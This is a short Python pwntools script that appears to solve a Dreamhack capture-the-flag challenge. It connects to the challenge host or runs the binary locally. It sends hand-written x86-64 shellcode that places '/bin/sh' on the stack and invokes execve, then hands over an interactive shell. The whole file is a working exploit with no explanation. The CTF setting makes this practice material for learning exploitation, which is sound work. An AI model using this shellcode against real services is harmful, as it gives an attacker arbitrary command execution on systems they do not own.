#!/usr/bin/env python3

from pwn import *

exe = ELF("./deploy/main")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 23326)

    return r


def main():
    r = conn()
    
    payload = asm("""
        push 59
        pop rax

        push 0x68732f
        pop rdi
        shl rdi, 32
        or rdi, 0x6e69622f
        push rdi
        
        push rsp
        pop rdi

        syscall
    """)

    r.sendafter(b"> ", payload)

    r.interactive()


if __name__ == "__main__":
    main()